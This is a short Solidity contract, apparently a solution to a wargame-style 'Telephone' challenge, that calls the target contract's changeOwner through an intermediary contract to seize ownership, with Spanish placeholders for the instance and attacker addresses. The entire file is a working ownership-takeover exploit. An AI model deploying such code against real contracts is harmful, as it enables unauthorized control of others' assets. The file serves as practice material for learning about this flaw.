import "./telephone.sol";

contract Telepwn {
    Telephone public originalContract = Telephone('Direccion de la instancia');
    
    function pwn() public{
        originalContract.changeOwner('Direccion del atacante');
    }
    
}